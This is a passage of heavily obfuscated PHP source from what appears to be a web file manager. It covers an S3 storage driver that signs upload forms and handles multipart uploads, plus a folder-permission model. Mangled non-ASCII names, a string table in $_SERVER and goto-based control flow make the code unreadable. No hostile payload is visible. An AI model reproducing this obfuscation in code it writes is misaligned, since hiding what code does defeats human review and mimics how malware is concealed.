$this->isFolder($f„¸­ÃÁ’Ô); } public function isFile($C–²ÀŒ»‰) { return !$this->isFolder($C–²ÀŒ»‰) && $this->objectMeta($C–²ÀŒ»‰); } public function isFolder($DĞ¸äóäô×) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][223], $DĞ¸äóäô×); } protected function objectMeta($f¢§ñã†’÷) { return $this->cacheMethod($_SERVER[¯Ò¬Èè][224], $f¢§ñã†’÷); } protected function _objectMeta($a÷ÉÑÒÅïÏ) { $EÙõÎ¡÷ =& $_SERVER[¯Ò¬Èè]; list($F²Ã°‚ˆ»‘, $cÁğ×†êÛ) = $this->bucketManager->stat($this->bucket, $a÷ÉÑÒÅïÏ); if ($F²Ã°‚ˆ»‘) { $F²Ã°‚ˆ»‘[$EÙõÎ¡÷[77]] = intval($F²Ã°‚ˆ»‘[$EÙõÎ¡÷[1224]]); } return $F²Ã°‚ˆ»‘; } protected function _isFolder($CåïÄ‹Šš) { $e¬¬î­œŠˆ =& $_SERVER[¯Ò¬Èè]; list($dà‚±ÉÚ³Œ, $c˜Åé…‡ÖÎ) = $this->bucketManager->listFiles($this->bucket, trim($CåïÄ‹Šš, $e¬¬î­œŠˆ[8]) . $e¬¬î­œŠˆ[8], $e¬¬î­œŠˆ[33], 1, $e¬¬î­œŠˆ[8]); return !empty($dà‚±ÉÚ³Œ[$e¬¬î­œŠˆ[1223]]) || !empty($dà‚±ÉÚ³Œ[$e¬¬î­œŠˆ[1226]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($dŒñ²˜„†¯) { parent::__construct($dŒñ²˜„†¯); } public function uploadFormData($C÷ëÍ“¥Üš, $dŠ²¡·“ğ• = 3600) { goto BÖâŸ“ÈÑù; fÅÓÃ¦‰Æ„: $DÃ«’©Œ™³ = base64_encode(json_encode($d­‚õÃ¾”˜)); $CÑ­ÚÌÛùï = hash_hmac($B¡œŞ×Ê¹©[1152], $bÜ±Ú¿öãƒ, $B¡œŞ×Ê¹©[1153] . $this->secret, !0); $bÁ”÷š·à = hash_hmac($B¡œŞ×Ê¹©[1152], $this->region, $CÑ­ÚÌÛùï, !0); goto e×”»áçÜ‹; cæŒ«ªìÔÑ: $fÍù„Éæ˜ = array($this->accessKey, $bÜ±Ú¿öãƒ, $this->region, $bÒÂÒˆ‹“, $EºÔÎ½·); $cä™ ‚Ó‰Ù = implode($B¡œŞ×Ê¹©[8], $fÍù„Éæ˜); $d­‚õÃ¾”˜ = array($B¡œŞ×Ê¹©[1111] => gmdate($B¡œŞ×Ê¹©[1110], strtotime($B¡œŞ×Ê¹©[1145])), $B¡œŞ×Ê¹©[1112] => array(array($B¡œŞ×Ê¹©[1114] => $this->bucket), array($B¡œŞ×Ê¹©[1113] => $Aœè²èİó‚), array($B¡œŞ×Ê¹©[1115], $B¡œŞ×Ê¹©[1116], $B¡œŞ×Ê¹©[33]), array($B¡œŞ×Ê¹©[1115], $B¡œŞ×Ê¹©[1146], $B¡œŞ×Ê¹©[33]), array($B¡œŞ×Ê¹©[1115], $B¡œŞ×Ê¹©[1147], $B¡œŞ×Ê¹©[33]), array($B¡œŞ×Ê¹©[1117] => $c”Õ•ì‡Ã), array($B¡œŞ×Ê¹©[1148] => $cä™ ‚Ó‰Ù), array($B¡œŞ×Ê¹©[1149] => $A‹ºßÍ©›³), array($B¡œŞ×Ê¹©[1150] => $BĞ…À¸™èÆ), array($B¡œŞ×Ê¹©[1151] => $a˜½”îƒë))); goto fÅÓÃ¦‰Æ„; BÖâŸ“ÈÑù: $B¡œŞ×Ê¹© =& $_SERVER[¯Ò¬Èè]; $Aœè²èİó‚ = $B¡œŞ×Ê¹©[185]; $A‹ºßÍ©›³ = $B¡œŞ×Ê¹©[1142]; goto DÓÆ³Üõó; fØõÜæÇŒ: $Dª›„ÂÛÚ = array($B¡œŞ×Ê¹©[199] => $B¡œŞ×Ê¹©[33], $B¡œŞ×Ê¹©[1154] => $B¡œŞ×Ê¹©[33], $B¡œŞ×Ê¹©[1113] => $Aœè²èİó‚, $B¡œŞ×Ê¹©[1117] => $c”Õ•ì‡Ã, $B¡œŞ×Ê¹©[1121] => $DÃ«’©Œ™³, $B¡œŞ×Ê¹©[1155] => $cä™ ‚Ó‰Ù, $B¡œŞ×Ê¹©[1156] => $A‹ºßÍ©›³, $B¡œŞ×Ê¹©[1157] => $BĞ…À¸™èÆ, $B¡œŞ×Ê¹©[1158] => $a˜½”îƒë, $B¡œŞ×Ê¹©[1159] => $C¡°«™‰Í, $B¡œŞ×Ê¹©[169] => $this->getHost()); return $Dª›„ÂÛÚ; goto DéõÃòšÀå; e×”»áçÜ‹: $Eê¤ŒÜÑÙ÷ = hash_hmac($B¡œŞ×Ê¹©[1152], $bÒÂÒˆ‹“, $bÁ”÷š·à, !0); $BŠŠ¾é¤¢… = hash_hmac($B¡œŞ×Ê¹©[1152], $EºÔÎ½·, $Eê¤ŒÜÑÙ÷, !0); $C¡°«™‰Í = hash_hmac($B¡œŞ×Ê¹©[1152], $DÃ«’©Œ™³, $BŠŠ¾é¤¢…); goto fØõÜæÇŒ; DÓÆ³Üõó: $bÒÂÒˆ‹“ = $B¡œŞ×Ê¹©[59]; $BĞ…À¸™èÆ = gmdate($B¡œŞ×Ê¹©[1143]); $bÜ±Ú¿öãƒ = gmdate($B¡œŞ×Ê¹©[704]); goto D«Ã…óØíã; D«Ã…óØíã: $EºÔÎ½· = $B¡œŞ×Ê¹©[1144]; $a˜½”îƒë = $dŠ²¡·“ğ• . $B¡œŞ×Ê¹©[33]; $c”Õ•ì‡Ã = $B¡œŞ×Ê¹©[1109]; goto cæŒ«ªìÔÑ; DéõÃòšÀå: } public function multiUploadFormData($f«£†‡æ, $EàÍ©šèæ = 3600) { $E§îİğ²¸ =& $_SERVER[¯Ò¬Èè]; $bíÚ´Ã£Áë = gmdate($E§îİğ²¸[1238]); $EÈç®‰ˆ¢ = array(); $Bó›ÑÙõ = $this->client->getUploadId($this->bucket, $f«£†‡æ, $EÈç®‰ˆ¢); if (!$Bó›ÑÙõ) { return !1; } return array($E§îİğ²¸[209] => $Bó›ÑÙõ, $E§îİğ²¸[169] => $this->getHost() . $E§îİğ²¸[8] . $this->pathEncode($f«£†‡æ), $E§îİğ²¸[210] => $bíÚ´Ã£Áë, $E§îİğ²¸[89] => $f«£†‡æ); } public function multiUploadAuthData($f‹½ŞÙ£ï, $fğâòŒ÷©© = array()) { goto B’«Šåñ“; B’«Šåñ“: $cÔˆÀ…ãŞ =& $_SERVER[¯Ò¬Èè]; $Dî£ÛÑªãè = isset($fğâòŒ÷©©[$cÔˆÀ…ãŞ[160]]) ? $fğâòŒ÷©©[$cÔˆÀ…ãŞ[160]] : $cÔˆÀ…ãŞ[33]; $fàêçòŒŒ = $fğâòŒ÷©©[$cÔˆÀ…ãŞ[89]]; goto A³ÜÔ©ƒœ; BçØ•™¡‹½: if (isset($fğâòŒ÷©©[$cÔˆÀ…ãŞ[1239]])) { $Aø×™Úì„[$cÔˆÀ…ãŞ[1240]] = $fğâòŒ÷©©[$cÔˆÀ…ãŞ[1239]]; } $e´´÷¨ÛÜğ = explode($cÔˆÀ…ãŞ[171], $this->getHost()); $AÆƒÑç¤šó = array($cÔˆÀ…ãŞ[1241] => $e´´÷¨ÛÜğ[1], $cÔˆÀ…ãŞ[1242] => $cÔˆÀ…ãŞ[33], $cÔˆÀ…ãŞ[199] => $cÔˆÀ…ãŞ[116], $cÔˆÀ…ãŞ[1154] => $fğâòŒ÷©©[$cÔˆÀ…ãŞ[77]]); goto dÜ—„Œ—¬; BØ…èšÔõ: if (strpos($Dî£ÛÑªãè, $cÔˆÀ…ãŞ[213]) === 0) { if (isset($Aø×™Úì„[$cÔˆÀ…ãŞ[1240]])) { $e³Ì¶¥Ù = $Aø×™Úì„[$cÔˆÀ…ãŞ[1240]]; } else { if (isset($Dâ¢ÚŠ‰×İ[$cÔˆÀ…ãŞ[1240]])) { $e³Ì¶¥Ù = $Dâ¢ÚŠ‰×İ[$cÔˆÀ…ãŞ[1240]]; } else { $e³Ì¶¥Ù = hash($cÔˆÀ…ãŞ[1152], $cÔˆÀ…ãŞ[33]); } } return array($cÔˆÀ…ãŞ[220] => $Dâ¢ÚŠ‰×İ[$cÔˆÀ…ãŞ[220]], $cÔˆÀ…ãŞ[1240] => $e³Ì¶¥Ù, $cÔˆÀ…ãŞ[210] => $Dâ¢ÚŠ‰×İ[$cÔˆÀ…ãŞ[1243]]); } return $Dâ¢ÚŠ‰×İ[$cÔˆÀ…ãŞ[220]]; goto f¶®Èíåêˆ; dÜ—„Œ—¬: $fÅ‘ŠïÊÉ™ = $cÔˆÀ…ãŞ[214]; $e÷Œª¼Ù«º = $cÔˆÀ…ãŞ[8] . $this->pathEncode($fàêçòŒŒ) . $Dî£ÛÑªãè; $Dâ¢ÚŠ‰×İ = $this->client->__getSignatureV4($Aø×™Úì„, $AÆƒÑç¤šó, $fÅ‘ŠïÊÉ™, $e÷Œª¼Ù«º); goto BØ…èšÔõ; A³ÜÔ©ƒœ: unset($fğâòŒ÷©©[$cÔˆÀ…ãŞ[89]]); if (isset($fğâòŒ÷©©[$cÔˆÀ…ãŞ[211]])) { return $this->listUploadParts($fàêçòŒŒ, $fğâòŒ÷©©); } $Aø×™Úì„ = array(); goto BçØ•™¡‹½; f¶®Èíåêˆ: } public function listUploadParts($Fí‘¸Ö¾‰Ù, $B¸…‘„ø‹ = array()) { goto Côë³‚°äÄ; d„–ƒ¬¥­¸: $F¾‹‡Û¥˜³ .= $CêÛ»ËÖÏ×[1247]; $DæÑ×ğÈÑÌ = array(); $EÙÍ„›®§ = explode($CêÛ»ËÖÏ×[171], $this->getHost()); goto Dñ·¿ä›¹î; Dñ·¿ä›¹î: $cÉäôÍÜ” = array($CêÛ»ËÖÏ×[1241] => $EÙÍ„›®§[1], $CêÛ»ËÖÏ×[199] => $CêÛ»ËÖÏ×[116], $CêÛ»ËÖÏ×[1154] => strlen($F¾‹‡Û¥˜³)); $Dôßåá¬ = $CêÛ»ËÖÏ×[212]; $b¨ÂÙ×öô = $CêÛ»ËÖÏ×[8] . $this->pathEncode($Fí‘¸Ö¾‰Ù) . $B¸…‘„ø‹[$CêÛ»ËÖÏ×[160]]; goto a¡£„¡¯; eÖİ²¢ÇÊÎ: if (!$B‚¶¯…È‘ç) { return !1; } $F¾‹‡Û¥˜³ = $CêÛ»ËÖÏ×[1244]; foreach ($B‚¶¯…È‘ç as $Aô’ĞÖ„) { $F¾‹‡Û¥˜³ .= $CêÛ»ËÖÏ×[1245] . "\x3c\x50\x61\x72\164\116\165\155\x62\x65\162\76{$Aô’ĞÖ„[$CêÛ»ËÖÏ×[1196]]}\74\x2f\120\141\x72\x74\116\x75\x6d\x62\x65\x72\x3e\xa" . "\74\x45\x54\141\x67\x3e{$Aô’ĞÖ„[$CêÛ»ËÖÏ×[1197]]}\74\x2f\x45\124\x61\147\76\xa" . $CêÛ»ËÖÏ×[1246]; } goto d„–ƒ¬¥­¸; Côë³‚°äÄ: $CêÛ»ËÖÏ× =& $_SERVER[¯Ò¬Èè]; $aŠ„œ‡åÈ = str_replace($CêÛ»ËÖÏ×[221], $CêÛ»ËÖÏ×[33], $B¸…‘„ø‹[$CêÛ»ËÖÏ×[160]]); $B‚¶¯…È‘ç = $this->client->listParts($this->bucket, $Fí‘¸Ö¾‰Ù, $aŠ„œ‡åÈ); goto eÖİ²¢ÇÊÎ; a¡£„¡¯: $f—¶å™…±Œ = $this->client->__getSignatureV4($DæÑ×ğÈÑÌ, $cÉäôÍÜ”, $Dôßåá¬, $b¨ÂÙ×öô, $F¾‹‡Û¥˜³); return array($CêÛ»ËÖÏ×[220] => $f—¶å™…±Œ[$CêÛ»ËÖÏ×[220]], $CêÛ»ËÖÏ×[210] => $f—¶å™…±Œ[$CêÛ»ËÖÏ×[1243]], $CêÛ»ËÖÏ×[222] => $B‚¶¯…È‘ç, $CêÛ»ËÖÏ×[1240] => $f—¶å™…±Œ[$CêÛ»ËÖÏ×[1240]]); goto bùºé«äÄï; bùºé«äÄï: } public function link($D¡¥Ù»†•, $F×µïÙ´´² = array()) { return parent::link($D¡¥Ù»†•, $F×µïÙ´´²); } public function fileOut($Aƒ¦õÅ‰®¥, $aìİ¦•Ôš = false, $aªà•‹É† = false, $D‹ĞåéÀ« = '') { if (strstr($this->endpoint, $_SERVER[¯Ò¬Èè][1248])) { return parent::fileOutServer($Aƒ¦õÅ‰®¥, $aìİ¦•Ôš, $aªà•‹É†, $D‹ĞåéÀ«); } parent::fileOut($Aƒ¦õÅ‰®¥, $aìİ¦•Ôš, $aªà•‹É†, $D‹ĞåéÀ«); } public function fileOutImage($Eö÷³–Í®ï, $f­™Íà§’¨ = 250) { if (strstr($this->endpoint, $_SERVER[¯Ò¬Èè][1248])) { return parent::fileOutImageServer($Eö÷³–Í®ï, $f­™Íà§’¨); } parent::fileOutImage($Eö÷³–Í®ï, $f­™Íà§’¨); } public function fileOutLink($BĞããÅäå©) { $F£¾ğÜ² =& $_SERVER[¯Ò¬Èè]; if (substr($BĞããÅäå©, 0, 7) == $F£¾ğÜ²[1124]) { $BĞããÅäå© = $F£¾ğÜ²[1125] . substr($BĞããÅäå©, 7); } header($F£¾ğÜ²[156] . $BĞããÅäå©); die; } public function getHost() { $BÌÎ—…ÌÜ¼ =& $_SERVER[¯Ò¬Èè]; $A¨âÇƒ’ = str_rtrim(parent::getHost(), $BÌÎ—…ÌÜ¼[8] . $this->bucket); $A¨âÇƒ’ = explode($BÌÎ—…ÌÜ¼[171], $A¨âÇƒ’); return $A¨âÇƒ’[0] . $BÌÎ—…ÌÜ¼[171] . $this->bucket . $BÌÎ—…ÌÜ¼[91] . $A¨âÇƒ’[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Få½§›æËÙ, $b³¢´Ø´šµ = 0) { parent::__construct(); $this->source = $Få½§›æËÙ; $this->sourceSize = $b³¢´Ø´šµ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($b¦ïì ›ÙÓ = false) { return $this->sourceSize; } public function getContent($dçŞó¨¦İö = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $f—»Ë‹–×Ó = ftell($this->source); $EÄíÈ‚‘—¾ = @fread($this->source, $this->sourceSize); fseek($this->source, $f—»Ë‹–×Ó); return $EÄíÈ‚‘—¾; } } public function fileSubstr($f‰ÊäÀ‹Ş¸ = false, $Cá¥“ÁĞùÑ = 0, $d„Àª¹‘ì» = 0) { if (!$d„Àª¹‘ì») { $d„Àª¹‘ì» = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Cá¥“ÁĞùÑ, $d„Àª¹‘ì»); } if ($this->sourceType == self::TYPE_FILE) { $bŒÏ‘í†÷„ = ftell($this->source); fseek($this->source, $bŒÏ‘í†÷„ + $Cá¥“ÁĞùÑ); $fÜ’õùãŞÚ = @fread($this->source, $d„Àª¹‘ì»); fseek($this->source, $bŒÏ‘í†÷„); return $fÜ’õùãŞÚ; } } public function hashMd5($CÑ½›Àœ¯ø = false) { return md5($this->getContent()); } public static function hash($d›Çìô¤ŒÕ, $a¼Ñ°š‘»¿ = 0) { $b³Š‚µ´óç = new PathDriverStream($d›Çìô¤ŒÕ, $a¼Ñ°š‘»¿); return $b³Š‚µ´óç->hashSimple($d›Çìô¤ŒÕ); } public static function md5($A«œÌ³¶Šø, $EæÄµ–¼Ï³ = 0) { $C×áÁ‹†–¹ = new PathDriverStream($A«œÌ³¶Šø, $EæÄµ–¼Ï³); return $C×áÁ‹†–¹->hashMd5($A«œÌ³¶Šø); } } goto aÁ¨ÏêÆÀ¾; cÆ½ÊË…ê: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\x65\137\141\x75\x74\150"; public function getAuth($e£Íµ‡¼ã») { goto D·“°ò±ò‹; D·“°ò±ò‹: $D„™‡‰Íµ  =& $_SERVER[¯Ò¬Èè]; $bªïùŸˆÛ = $D„™‡‰Íµ [2260]; $cÁÓçªêêõ = array($D„™‡‰Íµ [369] => $e£Íµ‡¼ã»); goto c¦‘Ã’ˆ´Ú; d™¢ÌºÛâ¬: return $EÓòÊ¥¢‘õ; goto Aß‰ÏËùğ; c¦‘Ã’ˆ´Ú: $aãà¤¿ëšé = $this->field($bªïùŸˆÛ)->order($D„™‡‰Íµ [367])->where($cÁÓçªêêõ)->select(); $EÓòÊ¥¢‘õ = array(); foreach ($aãà¤¿ëšé as $bÖ¨×­×ËÔ) { if (Model($D„™‡‰Íµ [2261])->listData($bÖ¨×­×ËÔ[$D„™‡‰Íµ [2242]])) { $EÓòÊ¥¢‘õ[] = $bÖ¨×­×ËÔ; } } goto d™¢ÌºÛâ¬; Aß‰ÏËùğ: } public function setAuth($B„áöĞïŠš, $Eß›àôŸ¼Ì) { goto E¤²›Õ¾¹ç; e­˜İ­Ú“š: $this->where(array($f·ÈëÈÎäÍ[383] => $B„áöĞïŠš))->delete(); $this->addAll($fØ·±¿óŸ–); return !0; goto c‰Ò±…Œ; D‘¡ŒµÃó: $eŞĞ•êèß = 1; $aÎÍãî¬ôä = $b§†‚Ø¹Êö[$f·ÈëÈÎäÍ[456]]; if ($aÎÍãî¬ôä != $eŞĞ•êèß) { $C‹šåí¼‚‡ = array($f·ÈëÈÎäÍ[2114] => $aÎÍãî¬ôä); $aõ½¬ƒ±— = Model($f·ÈëÈÎäÍ[2188])->field($f·ÈëÈÎäÍ[1446])->where($C‹šåí¼‚‡)->select(); $aõ½¬ƒ±— = array_to_keyvalue($aõ½¬ƒ±—, $f·ÈëÈÎäÍ[33], $f·ÈëÈÎäÍ[1446]); } goto Aƒİ®ø‹Ş¼; Aƒİ®ø‹Ş¼: $c‡”³˜ğ›› = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fØ·±¿óŸ– = array(); foreach ($Eß›àôŸ¼Ì as $aµ›Š«‚ª¯) { if (!in_array($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[371]], $c‡”³˜ğ››)) { show_json(LNG($f·ÈëÈÎäÍ[2262]), !1); } if ($aÎÍãî¬ôä != $eŞĞ•êèß) { if ($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[371]] == SourceModel::TYPE_GROUP) { } if ($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[456]] != 0 && !in_array($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[456]], $aõ½¬ƒ±—)) { } } if ($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[456]] == 0) { $aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[371]] = SourceModel::TYPE_USER; } $fØ·±¿óŸ–[] = array($f·ÈëÈÎäÍ[369] => $B„áöĞïŠš, $f·ÈëÈÎäÍ[371] => intval($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[371]]), $f·ÈëÈÎäÍ[456] => intval($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[456]]), $f·ÈëÈÎäÍ[2242] => intval($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[2242]]) ? intval($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[2242]]) : 0, $f·ÈëÈÎäÍ[2243] => intval($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[2243]]) ? intval($aµ›Š«‚ª¯[$f·ÈëÈÎäÍ[2243]]) : -1); } goto e­˜İ­Ú“š; E¤²›Õ¾¹ç: $f·ÈëÈÎäÍ =& $_SERVER[¯Ò¬Èè]; $b§†‚Ø¹Êö = Model($f·ÈëÈÎäÍ[1126])->sourceInfo($B„áöĞïŠš); if ($b§†‚Ø¹Êö[$f·ÈëÈÎäÍ[371]] != SourceModel::TYPE_GROUP) { return !1; } goto D‘¡ŒµÃó; c‰Ò±…Œ: } public function authClear($F±´Ë­‘¬„) { $d¹‹¬¹Ë…µ =& $_SERVER[¯Ò¬Èè]; $b±­ç…ñÉæ = Model($d¹‹¬¹Ë…µ[1126])->sourceInfo($F±´Ë­‘¬„); $bê×¡íëäÚ = array($F±´Ë­‘¬„); if ($b±­ç…ñÉæ[$d¹‹¬¹Ë…µ[370]] == $d¹‹¬¹Ë…µ[83]) { $F…îÛ = array($d¹‹¬¹Ë…µ[534] => array($d¹‹¬¹Ë…µ[483], $b±­ç…ñÉæ[$d¹‹¬¹Ë…µ[459]] . $F±´Ë­‘¬„ . $d¹‹¬¹Ë…µ[484])); $bê×¡íëäÚ = Model($d¹‹¬¹Ë…µ[1126])->field($d¹‹¬¹Ë…µ[383])->where($F…îÛ)->getField($d¹‹¬¹Ë…µ[369], !0); $bê×¡íëäÚ[] = $F±´Ë­‘¬„; } $this->where(array($d¹‹¬¹Ë…µ[383] => array($d¹‹¬¹Ë…µ[384], $bê×¡íëäÚ)))->delete(); return !0; } public function get($d’·åœºïã) { $d×„âéÙ¬ = $this->getSourceList(array($d’·åœºïã), !0); return $d×„âéÙ¬[0]; } public function getSourceList($bí™ĞŠƒå, $cÜîÂà—¨ = false) { goto D„©åíÑ°Ê; A…¶ÔĞŒª†: $DÅ§°‰Š¥ª = array_values(array_unique($DÅ§°‰Š¥ª)); if (!$DÅ§°‰Š¥ª) { return array(); } $eÓæîïêÕÇ = $c®ö”çå¦Á[2264]; goto b²‘Õ—Ú÷; D„©åíÑ°Ê: $c®ö”çå¦Á =& $_SERVER[¯Ò¬Èè]; if (!$bí™ĞŠƒå) { return array(); } $a•Óğ•Íé® = Model($c®ö”çå¦Á[1126]); goto C­ò­Î£ÌÃ; cô—óÜÂ¨¬: $Bš“Å×¡Ú = array(); foreach ($cÜîÂà—¨ as $B›¨Ú¡ŸÎ => $AÆÌŸôÃäß) { $Bš“Å×¡Ú[$B›¨Ú¡ŸÎ] = $this->makeSourceAuth($AÆÌŸôÃäß, $EùæÍ‡×); } return $Bš“Å×¡Ú; goto c»¿šéª‹; C­ò­Î£ÌÃ: if (!$cÜîÂà—¨) { $f½˜İŸäù = array($c®ö”çå¦Á[383] => array($c®ö”çå¦Á[384], $bí™ĞŠƒå)); $cÜîÂà—¨ = $a•Óğ•Íé®->field($c®ö”çå¦Á[2263])->where($f½˜İŸäù)->select(); $cÜîÂà—¨ = array_to_keyvalue($cÜîÂà—¨, $c®ö”çå¦Á[369]); } $DÅ§°‰Š¥ª = $bí™ĞŠƒå; foreach ($cÜîÂà—¨ as $AÏ–ÊƒÕ‰ => $D³ôÕÄ‰´) { $e¦¿‚Æ¯ã = $a•Óğ•Íé®->parentLevelArray($D³ôÕÄ‰´[$c®ö”çå¦Á[459]]); $DÅ§°‰Š¥ª = array_merge($DÅ§°‰Š¥ª, $e¦¿‚Æ¯ã, array($AÏ–ÊƒÕ‰)); } goto A…¶ÔĞŒª†; b²‘Õ—Ú÷: $f½˜İŸäù = array($c®ö”çå¦Á[383] => array($c®ö”çå¦Á[384], $DÅ§°‰Š¥ª)); $EùæÍ‡× = $this->field($eÓæîïêÕÇ)->where($f½˜İŸäù)->select(); $EùæÍ‡× = array_to_keyvalue_group($EùæÍ‡×, $c®ö”çå¦Á[369]); goto cô—óÜÂ¨¬; c»¿šéª‹: } public function authDeepCheck($bØåØµŸçÕ) { goto aª…ğ”âŞ; F‚‰•Ä¦á‡: if (!in_array($bØåØµŸçÕ, $c¼Ëå‹Š§¯[$a¼áÂÓâõ§[2265]])) { return !1; } $Dîê©ĞæÖ† = array(); foreach ($c¼Ëå‹Š§¯[$a¼áÂÓâõ§[2266]] as $d¾ãšöÓï° => $Fƒ©µÚ†‚ç) { if (!in_array($bØåØµŸçÕ, $Fƒ©µÚ†‚ç)) { continue; } $Dîê©ĞæÖ†[] = $d¾ãšöÓï°; } goto C›ñøÛíïò; C›ñøÛíïò: $dÓÅ¸ôâ„” = $Dîê©ĞæÖ† ? $Dîê©ĞæÖ†[0] : $bØåØµŸçÕ; return array($a¼áÂÓâõ§[377] => -1, $a¼áÂÓâõ§[418] => array($a¼áÂÓâõ§[385] => $a¼áÂÓâõ§[1040], $a¼áÂÓâõ§[2120] => $a¼áÂÓâõ§[468], $a¼áÂÓâõ§[386] => LNG($a¼áÂÓâõ§[2267]), $a¼áÂÓâõ§[2132] => $a¼áÂÓâõ§[2268]), $a¼áÂÓâõ§[2269] => array($a¼áÂÓâõ§[388] => $a¼áÂÓâõ§[2270], $a¼áÂÓâõ§[75] => $dÓÅ¸ôâ„”)); goto bÅ¿„ØŠò—; aª…ğ”âŞ: $a¼áÂÓâõ§ =& $_SERVER[¯Ò¬Èè]; if (_get($GLOBALS, $a¼áÂÓâõ§[457])) { return !1; } $c¼Ëå‹Š§¯ = $this->makeAuthDeep(); goto F‚‰•Ä¦á‡; bÅ¿„ØŠò—: } protected function makeAuthDeep() { goto a°´µÙ…”Ñ; AËŠè‹·Ä: $f«¿í§½Šê = Model($C‹Ç¨ÆÂé[2271])->listData(); $A¹¹ƒ¿…° = array(); foreach ($f«¿í§½Šê as $AÕÊœ’ÕŠ«) { if ($AÕÊœ’ÕŠ«[$C‹Ç¨ÆÂé[376]] == 0 && $AÕÊœ’ÕŠ«[$C‹Ç¨ÆÂé[2134]] == $C‹Ç¨ÆÂé[83]) { $A¹¹ƒ¿…°[] = $AÕÊœ’ÕŠ«[$C‹Ç¨ÆÂé[367]]; } } goto d‡¨Ëù±Œø; F¥œŞŠ«Î¨: if ($Fğ¨¿—„šÕ) { $B·„Öª¸¤ = array(array($C‹Ç¨ÆÂé[371] => SourceModel::TYPE_USER, $C‹Ç¨ÆÂé[456] => USER_ID), array($C‹Ç¨ÆÂé[371] => SourceModel::TYPE_GROUP, $C‹Ç¨ÆÂé[456] => array($C‹Ç¨ÆÂé[384], $Fğ¨¿—„šÕ)), $C‹Ç¨ÆÂé[923] => $C‹Ç¨ÆÂé[2194]); } if ($A¹¹ƒ¿…°) { $B·„Öª¸¤ = array($B·„Öª¸¤, $C‹Ç¨ÆÂé[2242] => array($C‹Ç¨ÆÂé[2272], $A¹¹ƒ¿…°)); } $bß…ªŒ‚¢ = $this->field($C‹Ç¨ÆÂé[2273])->where($B·„Öª¸¤)->select(); goto eƒÛË†ø¿Í; eƒÛË†ø¿Í: $d™†ÚÉ£ß = array_to_keyvalue($bß…ªŒ‚¢, $C‹Ç¨ÆÂé[33], $C‹Ç¨ÆÂé[369]); $D—ÕŸª‹£« = array(); $Bãî„¶Õº = $Fğ¨¿—„šÕ; goto d°¢Á‘îµ‚; dÊßĞ§ƒ¾: foreach ($eá²˜ªäğà as $D¥Ì™ŒÙÓ«) { $FØ•™é ‚ƒ = $a¿´Ì„½±š->getInfo($D¥Ì™ŒÙÓ«); $C’à»ÏÖù¤ = $fŠÜ²ëß‡ù->parentLevelArray($FØ•™é ‚ƒ[$C‹Ç¨ÆÂé[459]]); $Bãî„¶Õº = array_merge($Bãî„¶Õº, $C’à»ÏÖù¤); } $Bãî„¶Õº = array_values(array_unique($Bãî„¶Õº)); foreach ($Bãî„¶Õº as $D¥Ì™ŒÙÓ«) { $FØ•™é ‚ƒ = $a¿´Ì„½±š->getInfo($D¥Ì™ŒÙÓ«); $D—ÕŸª‹£«[] = $FØ•™é ‚ƒ[$C‹Ç¨ÆÂé[391]][$C‹Ç¨ÆÂé[369]]; $C…Ãø†öÀó[$D¥Ì™ŒÙÓ«] = $FØ•™é ‚ƒ[$C‹Ç¨ÆÂé[391]][$C‹Ç¨ÆÂé[369]]; $e«»Ü„·æš[$D¥Ì™ŒÙÓ«] = $fŠÜ²ëß‡ù->parentLevelArray($FØ•™é ‚ƒ[$C‹Ç¨ÆÂé[459]]); } goto EÑğë’’ÉÅ; D”ôââä“Ü: $D½š³†Ã¡É = array(); $C…Ãø†öÀó = array(); $e«»Ü„·æš = array(); goto b˜ª«ÜŞ¹°; EÑğë’’ÉÅ: foreach ($A •¼è‹§• as $f³´ÓŠËÕ => $c¡Ïâ–¿Ã¦) { $D…è²¶ñê = $D½š³†Ã¡É[$f³´ÓŠËÕ]; if (!$D…è²¶ñê || !$C…Ãø†öÀó[$D…è²¶ñê]) { continue; } $eÎ­ƒ”¡ = array(); foreach ($e«»Ü„·æš[$D…è²¶ñê] as $D¥Ì™ŒÙÓ«) { $eÎ­ƒ”¡[] = $C…Ãø†öÀó[$D¥Ì™ŒÙÓ«]; } $A •¼è‹§•[$f³´ÓŠËÕ] = array_merge($eÎ­ƒ”¡, $c¡Ïâ–¿Ã¦); } $D—ÕŸª‹£« = array_values(array_unique($D—ÕŸª‹£«)); $F„Å«÷è§¢ = array($C‹Ç¨ÆÂé[2265] => $D—ÕŸª‹£«, $C‹Ç¨ÆÂé[2266] => $A •¼è‹§•); goto bÃ¿©îâ…Ä; b˜ª«ÜŞ¹°: if ($d™†ÚÉ£ß) { $c°ˆ÷ãË©« = $fŠÜ²ëß‡ù->where(array($C‹Ç¨ÆÂé[369] => array($C‹Ç¨ÆÂé[384], $d™†ÚÉ£ß)))->select(); foreach ($c°ˆ÷ãË©« as $b›ÑÙ½Ñˆ’) { $C’à»ÏÖù¤ = $fŠÜ²ëß‡ù->parentLevelArray($b›ÑÙ½Ñˆ’[$C‹Ç¨ÆÂé[459]]); $D—ÕŸª‹£« = array_merge($D—ÕŸª‹£«, $C’à»ÏÖù¤); $Bãî„¶Õº[] = $b›ÑÙ½Ñˆ’[$C‹Ç¨ÆÂé[456]]; $A •¼è‹§•[$b›ÑÙ½Ñˆ’[$C‹Ç¨ÆÂé[369]]] = $C’à»ÏÖù¤; $D½š³†Ã¡É[$b›ÑÙ½Ñˆ’[$C‹Ç¨ÆÂé[369]]] = 